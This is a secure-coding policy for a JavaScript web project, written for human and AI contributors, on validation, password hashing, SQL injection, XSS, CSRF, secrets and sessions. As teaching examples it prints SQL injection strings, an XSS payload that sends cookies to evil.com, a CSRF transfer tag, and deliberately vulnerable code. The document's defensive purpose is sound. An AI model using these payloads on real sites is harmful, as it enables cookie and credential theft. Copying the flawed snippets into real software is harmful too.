# Security Policy

**Audience:** All contributors (human and AI)
**Purpose:** Security best practices and vulnerability prevention
**Last Updated:** 2025-12-22

---

## Table of Contents

1. [Security Philosophy](#security-philosophy)
2. [Input Validation](#input-validation)
3. [Authentication & Authorization](#authentication--authorization)
4. [Database Security](#database-security)
5. [Cross-Site Scripting (XSS) Prevention](#cross-site-scripting-xss-prevention)
6. [Cross-Site Request Forgery (CSRF) Prevention](#cross-site-request-forgery-csrf-prevention)
7. [Dependency Management](#dependency-management)
8. [Secrets Management](#secrets-management)
9. [API Security](#api-security)
10. [Session Management](#session-management)
11. [OWASP Top 10 Checklist](#owasp-top-10-checklist)
12. [Security Testing](#security-testing)

---

## Security Philosophy

### Core Principles

**Defense in Depth:**
- Multiple layers of security controls
- If one layer fails, others still protect
- Never rely on single security mechanism

**Fail Securely:**
- Default to denying access on error
- Log security-relevant failures
- Don't expose internal details in error messages

**Principle of Least Privilege:**
- Grant minimum permissions required
- Separate read/write permissions
- Time-bound elevated access

**Never Trust User Input:**
- Validate all input from any external source
- Sanitize before processing
- Encode before output

**Security by Design, Not Afterthought:**
- Consider security during design phase
- Security requirements in feature planning
- Threat modeling for new features

---

## Input Validation

### Validation Requirements

**ALL input must be validated:**
- User form submissions
- URL parameters
- HTTP headers
- File uploads
- API request bodies
- Database query results from untrusted sources

### Validation Strategy: Allowlist Over Blocklist

**Good (Allowlist - Explicit Valid Values):**
```javascript
function validateUserRole(role) {
  const validRoles = ['admin', 'user', 'guest'];

  if (!validRoles.includes(role)) {
    throw new Error('Invalid role');
  }

  return role;
}
```

**Bad (Blocklist - Try to Block Invalid):**
```javascript
function validateUserRole(role) {
  // ❌ Endless list of what NOT to allow
  const invalidRoles = ['superadmin', 'root', 'system'];

  if (invalidRoles.includes(role)) {
    throw new Error('Invalid role');
  }

  return role; // What if role is 'hacker'? Not blocked!
}
```

### Common Validation Patterns

**Email Validation:**
```javascript
function validateEmail(email) {
  // Basic format check
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!email || typeof email !== 'string') {
    throw new Error('Email is required');
  }

  if (email.length > 254) {
    throw new Error('Email too long');
  }

  if (!emailRegex.test(email)) {
    throw new Error('Invalid email format');
  }

  return email.toLowerCase().trim();
}
```

**String Length Validation:**
```javascript
function validateUsername(username) {
  if (!username || typeof username !== 'string') {
    throw new Error('Username is required');
  }

  const trimmed = username.trim();

  if (trimmed.length < 3) {
    throw new Error('Username must be at least 3 characters');
  }

  if (trimmed.length > 20) {
    throw new Error('Username must be no more than 20 characters');
  }

  // Allowlist: only alphanumeric and underscore
  if (!/^[a-zA-Z0-9_]+$/.test(trimmed)) {
    throw new Error('Username can only contain letters, numbers, and underscores');
  }

  return trimmed;
}
```

**Numeric Range Validation:**
```javascript
function validateAge(age) {
  const numAge = Number(age);

  if (!Number.isInteger(numAge)) {
    throw new Error('Age must be an integer');
  }

  if (numAge < 0 || numAge > 150) {
    throw new Error('Age must be between 0 and 150');
  }

  return numAge;
}
```

**File Upload Validation:**
```javascript
function validateImageUpload(file) {
  // Validate file exists
  if (!file) {
    throw new Error('No file provided');
  }

  // Validate file size (5MB max)
  const maxSize = 5 * 1024 * 1024;
  if (file.size > maxSize) {
    throw new Error('File too large (max 5MB)');
  }

  // Validate MIME type (allowlist)
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
  if (!allowedTypes.includes(file.type)) {
    throw new Error('Invalid file type. Only JPEG, PNG, GIF, and WebP allowed');
  }

  // Validate file extension matches MIME type
  const extension = file.name.split('.').pop().toLowerCase();
  const mimeToExtension = {
    'image/jpeg': ['jpg', 'jpeg'],
    'image/png': ['png'],
    'image/gif': ['gif'],
    'image/webp': ['webp']
  };

  if (!mimeToExtension[file.type]?.includes(extension)) {
    throw new Error('File extension does not match file type');
  }

  return file;
}
```

### Input Sanitization

**When to Sanitize:**
- After validation
- Before storing in database
- Before displaying to users
- Before using in system commands

**Example: Sanitize HTML Content**
```javascript
import DOMPurify from 'dompurify';

function sanitizeUserContent(htmlContent) {
  // Validate first
  if (!htmlContent || typeof htmlContent !== 'string') {
    throw new Error('Content is required');
  }

  if (htmlContent.length > 100000) {
    throw new Error('Content too long');
  }

  // Sanitize: Remove potentially dangerous HTML
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOWED_URI_REGEXP: /^https?:\/\//  // Only HTTP(S) links
  });

  return clean;
}
```

---

## Authentication & Authorization

### Password Security

**Password Hashing:**
```javascript
import bcrypt from 'bcrypt';

// GOOD: Hash password with bcrypt
async function hashPassword(plainPassword) {
  // Validate password strength first
  if (plainPassword.length < 8) {
    throw new Error('Password must be at least 8 characters');
  }

  const saltRounds = 12;  // Higher = more secure, slower
  const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);

  return hashedPassword;
}

// Verify password
async function verifyPassword(plainPassword, hashedPassword) {
  return await bcrypt.compare(plainPassword, hashedPassword);
}
```

**BAD - Never Do This:**
```javascript
// ❌ NEVER store plain text passwords
function savePassword(password) {
  db.save({ password: password });
}

// ❌ NEVER use weak hashing (MD5, SHA1, SHA256 without salt)
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
}

// ❌ NEVER use reversible encryption for passwords
function encryptPassword(password) {
  return encrypt(password, secretKey);  // Can be decrypted!
}
```

### Password Requirements

**Enforce Strong Passwords:**
```javascript
function validatePasswordStrength(password) {
  const errors = [];

  if (password.length < 8) {
    errors.push('Must be at least 8 characters');
  }

  if (!/[a-z]/.test(password)) {
    errors.push('Must contain lowercase letter');
  }

  if (!/[A-Z]/.test(password)) {
    errors.push('Must contain uppercase letter');
  }

  if (!/[0-9]/.test(password)) {
    errors.push('Must contain number');
  }

  if (!/[!@#$%^&*]/.test(password)) {
    errors.push('Must contain special character (!@#$%^&*)');
  }

  // Check against common passwords
  const commonPasswords = ['password', '12345678', 'qwerty', 'admin'];
  if (commonPasswords.includes(password.toLowerCase())) {
    errors.push('Password is too common');
  }

  if (errors.length > 0) {
    throw new Error(`Password validation failed:\n${errors.join('\n')}`);
  }

  return true;
}
```

### Account Lockout (Brute Force Prevention)

```javascript
const loginAttempts = new Map(); // In production: use Redis or database

async function attemptLogin(username, password) {
  const attempts = loginAttempts.get(username) || { count: 0, lockedUntil: null };

  // Check if account is locked
  if (attempts.lockedUntil && attempts.lockedUntil > Date.now()) {
    const minutesRemaining = Math.ceil((attempts.lockedUntil - Date.now()) / 60000);
    throw new Error(`Account locked. Try again in ${minutesRemaining} minutes`);
  }

  // Verify credentials
  const user = await db.findUserByUsername(username);
  if (!user || !(await verifyPassword(password, user.hashedPassword))) {
    // Increment failed attempts
    attempts.count++;

    // Lock account after 5 failed attempts
    if (attempts.count >= 5) {
      attempts.lockedUntil = Date.now() + (15 * 60 * 1000); // 15 minutes
      loginAttempts.set(username, attempts);
      throw new Error('Too many failed attempts. Account locked for 15 minutes');
    }

    loginAttempts.set(username, attempts);
    throw new Error('Invalid username or password');
  }

  // Successful login - reset attempts
  loginAttempts.delete(username);
  return user;
}
```

### Rate Limiting

```javascript
import rateLimit from 'express-rate-limit';

// Limit login attempts per IP
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply to login route
app.post('/api/login', loginLimiter, async (req, res) => {
  // ... login logic
});

// Limit API requests per user
const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute
  keyGenerator: (req) => req.user.id, // Rate limit per user
});

app.use('/api/', apiLimiter);
```

### Authorization Checks

```javascript
// Check permissions before operations
function requirePermission(user, permission) {
  if (!user) {
    throw new Error('Authentication required');
  }

  if (!user.permissions.includes(permission)) {
    throw new Error(`Missing required permission: ${permission}`);
  }
}

// Example usage
async function deleteUser(requestingUser, targetUserId) {
  // Check permission
  requirePermission(requestingUser, 'users:delete');

  // Additional check: can't delete yourself
  if (requestingUser.id === targetUserId) {
    throw new Error('Cannot delete your own account');
  }

  // Additional check: can't delete super admins unless you are one
  const targetUser = await db.findUserById(targetUserId);
  if (targetUser.role === 'superadmin' && requestingUser.role !== 'superadmin') {
    throw new Error('Insufficient permissions to delete super admin');
  }

  await db.deleteUser(targetUserId);
}
```

---

## Database Security

### SQL Injection Prevention

**GOOD: Parameterized Queries (Prepared Statements)**
```javascript
// ✅ Using parameterized query
async function findUserByEmail(email) {
  const query = 'SELECT * FROM users WHERE email = ?';
  const results = await db.query(query, [email]);
  return results[0];
}

// ✅ Using ORM (e.g., Sequelize)
async function findUserByEmail(email) {
  return await User.findOne({
    where: { email: email }
  });
}
```

**BAD: String Concatenation**
```javascript
// ❌ NEVER concatenate user input into SQL
async function findUserByEmail(email) {
  // Vulnerable to SQL injection!
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  const results = await db.query(query);
  return results[0];
}

// Attack example:
// email = "' OR '1'='1"
// Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
// Returns ALL users!
```

### SQL Injection Attack Examples & Prevention

**Attack Scenario 1: Authentication Bypass**
```javascript
// Vulnerable code
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

// Attack:
// username: admin' --
// password: anything
// Resulting query: SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
// The -- comments out the password check!

// Prevention: Use parameterized queries
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
await db.query(query, [username, password]);
```

**Attack Scenario 2: Data Exfiltration**
```javascript
// Vulnerable code
const query = `SELECT * FROM products WHERE category = '${category}'`;

// Attack:
// category: "' UNION SELECT username, password FROM users --"
// Exposes user credentials!

// Prevention: Parameterized queries + input validation
function validateCategory(category) {
  const validCategories = ['electronics', 'books', 'clothing'];
  if (!validCategories.includes(category)) {
    throw new Error('Invalid category');
  }
  return category;
}
```

### Database Connection Security

```javascript
// ✅ GOOD: Use environment variables for credentials
const dbConfig = {
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
  ssl: {
    rejectUnauthorized: true  // Enforce SSL certificate validation
  }
};

// ❌ BAD: Hardcoded credentials
const dbConfig = {
  host: 'localhost',
  user: 'admin',
  password: 'admin123',  // NEVER do this!
  database: 'myapp'
};
```

---

## Cross-Site Scripting (XSS) Prevention

### Types of XSS

**1. Stored XSS (Most Dangerous)**
- Malicious script stored in database
- Executed when data is displayed
- Affects all users who view the data

**2. Reflected XSS**
- Malicious script in URL/form submission
- Reflected back in response
- Affects users who click malicious link

**3. DOM-based XSS**
- Malicious script manipulates DOM directly
- Never touches server
- Occurs in client-side JavaScript

### XSS Prevention Strategies

**Strategy 1: Output Encoding (Always)**
```javascript
// React (automatic escaping)
function UserProfile({ user }) {
  // ✅ React automatically escapes user.name
  return <div>Welcome, {user.name}</div>;

  // ❌ dangerouslySetInnerHTML bypasses escaping
  return <div dangerouslySetInnerHTML={{ __html: user.bio }} />;
}

// Vanilla JavaScript
function displayUsername(username) {
  // ✅ textContent automatically escapes
  document.getElementById('username').textContent = username;

  // ❌ innerHTML can execute scripts
  document.getElementById('username').innerHTML = username;
}
```

**Strategy 2: Sanitize HTML Input**
```javascript
import DOMPurify from 'dompurify';

function displayUserBio(bio) {
  // ✅ Sanitize before rendering
  const clean = DOMPurify.sanitize(bio, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []  // No attributes allowed
  });

  document.getElementById('bio').innerHTML = clean;
}
```

**Strategy 3: Content Security Policy (CSP)**
```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +  // Only scripts from same origin
    "style-src 'self' 'unsafe-inline'; " +  // Allow inline styles
    "img-src 'self' https:; " +  // Allow HTTPS images
    "object-src 'none'"  // Block plugins (Flash, etc.)
  );
  next();
});
```

### XSS Attack Examples

**Example 1: Stored XSS via Comment**
```javascript
// User submits comment:
// "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"

// Vulnerable code (stored in DB, displayed to all users)
function displayComment(comment) {
  document.getElementById('comment').innerHTML = comment.text;
  // ❌ Script executes, steals cookies from all viewers!
}

// Secure code
function displayComment(comment) {
  // ✅ Option 1: Escape
  document.getElementById('comment').textContent = comment.text;

  // ✅ Option 2: Sanitize
  const clean = DOMPurify.sanitize(comment.text);
  document.getElementById('comment').innerHTML = clean;
}
```

**Example 2: Reflected XSS via URL Parameter**
```javascript
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// Vulnerable code
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Search results for: ${query}</h1>`);
  // ❌ Script executes!
});

// Secure code
app.get('/search', (req, res) => {
  const query = req.query.q;
  // ✅ Use templating engine with auto-escaping
  res.render('search', { query: query });
  // Or manually escape
  const escaped = escapeHtml(query);
  res.send(`<h1>Search results for: ${escaped}</h1>`);
});
```

---

## Cross-Site Request Forgery (CSRF) Prevention

### What is CSRF?

Attacker tricks user into making unwanted request to site where user is authenticated.

**Attack Example:**
```html
<!-- Attacker's malicious website -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000">
<!-- If user is logged into yourbank.com, transfer happens! -->
```

### CSRF Prevention: Token-Based

```javascript
// Generate CSRF token on session creation
import crypto from 'crypto';

function createSession(userId) {
  const csrfToken = crypto.randomBytes(32).toString('hex');

  return {
    userId: userId,
    csrfToken: csrfToken,
    createdAt: Date.now()
  };
}

// Include token in forms
app.get('/transfer', (req, res) => {
  res.render('transfer-form', {
    csrfToken: req.session.csrfToken
  });
});

// Verify token on submission
app.post('/transfer', (req, res) => {
  // Check token
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }

  // Process transfer
  processTransfer(req.body);
});
```

### CSRF Prevention: SameSite Cookies

```javascript
// Set SameSite attribute on session cookie
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,  // Prevent JavaScript access
    secure: true,    // Only send over HTTPS
    sameSite: 'strict'  // Only send from same site
  }
}));
```

---

## Dependency Management

### Avoid Known Vulnerabilities

```bash
# Check for vulnerabilities
npm audit

# Fix automatically (if possible)
npm audit fix

# Review unfixable vulnerabilities
npm audit fix --force  # Use with caution!
```

### Dependency Security Checklist

- [ ] Run `npm audit` before every release
- [ ] Keep dependencies up to date
- [ ] Review dependency changes in PRs
- [ ] Minimize number of dependencies
- [ ] Use lock files (package-lock.json)
- [ ] Audit new dependencies before adding

### Dangerous Patterns to Avoid

```javascript
// ❌ NEVER use eval()
eval(userInput);  // Can execute arbitrary code!

// ❌ NEVER use Function constructor with user input
new Function(userInput)();

// ❌ NEVER execute child processes with user input
exec(`ls ${userInput}`);  // Command injection!

// ✅ If you must execute commands, use allowlist and validation
function listDirectory(directory) {
  const validDirectories = ['/var/log', '/tmp', '/home'];

  if (!validDirectories.includes(directory)) {
    throw new Error('Invalid directory');
  }

  // Use execFile with array (not string concatenation)
  execFile('ls', [directory], (error, stdout) => {
    // ...
  });
}
```

---

## Secrets Management

### Never Commit Secrets

**Use Environment Variables:**
```javascript
// ✅ GOOD
const apiKey = process.env.API_KEY;
const dbPassword = process.env.DB_PASSWORD;

// ❌ BAD
const apiKey = 'sk-1234567890abcdef';  // NEVER hardcode!
```

**.gitignore Must Include:**
```
.env
.env.local
.env.*.local
secrets/
*.key
*.pem
credentials.json
```

### Secure Environment Variables

```bash
# .env.example (commit this)
API_KEY=your_api_key_here
DB_PASSWORD=your_database_password

# .env (DO NOT commit this)
API_KEY=sk-actual-api-key-123
DB_PASSWORD=actual_password_456
```

### Secret Rotation

- Change secrets regularly (quarterly for most, monthly for critical)
- Change immediately if compromised
- Use secret management services (AWS Secrets Manager, HashiCorp Vault)

---

## API Security

### Authentication for APIs

```javascript
// Verify API key
function requireApiKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];

  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }

  // Look up API key in database
  const validKey = await db.findApiKey(apiKey);

  if (!validKey || !validKey.isActive) {
    return res.status(403).json({ error: 'Invalid API key' });
  }

  req.apiKey = validKey;
  next();
}

app.use('/api/', requireApiKey);
```

### Input Validation for APIs

```javascript
app.post('/api/users', async (req, res) => {
  try {
    // Validate request body
    const { email, name, age } = req.body;

    validateEmail(email);

    if (!name || typeof name !== 'string' || name.length > 100) {
      return res.status(400).json({ error: 'Invalid name' });
    }

    const numAge = validateAge(age);

    // Create user
    const user = await db.createUser({ email, name, age: numAge });

    res.status(201).json({ user });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

### HTTPS Only

```javascript
// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (!req.secure && process.env.NODE_ENV === 'production') {
    return res.redirect('https://' + req.headers.host + req.url);
  }
  next();
});

// Or use HSTS header
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});
```

---

## Session Management

### Secure Session Configuration

```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,  // Long, random string
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,      // Prevent JavaScript access
    secure: true,        // Only send over HTTPS
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000      // 1 hour (session timeout)
  }
}));
```

### Session Timeout

```javascript
// Automatically expire sessions
function checkSessionTimeout(req, res, next) {
  if (req.session.lastActivity) {
    const timeout = 30 * 60 * 1000; // 30 minutes
    const elapsed = Date.now() - req.session.lastActivity;

    if (elapsed > timeout) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session expired' });
    }
  }

  req.session.lastActivity = Date.now();
  next();
}
```

---

## OWASP Top 10 Checklist

### 1. Broken Access Control
- [ ] Authorization checks on all sensitive operations
- [ ] Can't access other users' data by changing ID in URL
- [ ] Admin functions require admin role

### 2. Cryptographic Failures
- [ ] Use HTTPS for all traffic
- [ ] Hash passwords with bcrypt
- [ ] Don't store sensitive data unnecessarily
- [ ] Encrypt sensitive data at rest

### 3. Injection
- [ ] Parameterized queries for database
- [ ] Validate all user input
- [ ] Sanitize output
- [ ] No `eval()` with user input

### 4. Insecure Design
- [ ] Threat modeling performed
- [ ] Security requirements documented
- [ ] Rate limiting on sensitive operations

### 5. Security Misconfiguration
- [ ] Remove default accounts
- [ ] Disable directory listing
- [ ] Error messages don't expose internals
- [ ] Security headers configured

### 6. Vulnerable and Outdated Components
- [ ] Run `npm audit` regularly
- [ ] Keep dependencies updated
- [ ] Remove unused dependencies

### 7. Identification and Authentication Failures
- [ ] Strong password requirements
- [ ] Account lockout after failed attempts
- [ ] Multi-factor authentication (where applicable)
- [ ] Secure session management

### 8. Software and Data Integrity Failures
- [ ] Use lock files (package-lock.json)
- [ ] Verify integrity of dependencies
- [ ] Code review process

### 9. Security Logging and Monitoring Failures
- [ ] Log authentication events
- [ ] Log authorization failures
- [ ] Monitor for suspicious patterns
- [ ] Alerts for critical failures

### 10. Server-Side Request Forgery (SSRF)
- [ ] Validate URLs before fetching
- [ ] Allowlist allowed domains
- [ ] Don't fetch user-provided URLs directly

---

## Security Testing

### Manual Testing Checklist

**Authentication:**
- [ ] Try weak passwords
- [ ] Try common passwords
- [ ] Test account lockout
- [ ] Test password reset flow

**Authorization:**
- [ ] Try accessing other users' data
- [ ] Try admin functions as normal user
- [ ] Try operations without authentication

**Input Validation:**
- [ ] Try SQL injection payloads
- [ ] Try XSS payloads
- [ ] Try extremely long inputs
- [ ] Try special characters
- [ ] Try null/undefined/empty values

**Session Management:**
- [ ] Try using old session after logout
- [ ] Try session fixation
- [ ] Test session timeout

### Automated Security Testing

```bash
# OWASP ZAP (Zed Attack Proxy)
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://yourapp.com

# npm audit
npm audit

# Snyk (dependency scanning)
npx snyk test
```

---

**Related Documentation:**
- [Code Quality Standards](code-quality-standards.md) - Error handling and validation patterns
- [Testing Strategy](testing-strategy.md) - Security testing approaches

---

**Last Updated:** 2025-12-22
**Maintained By:** Framework Team
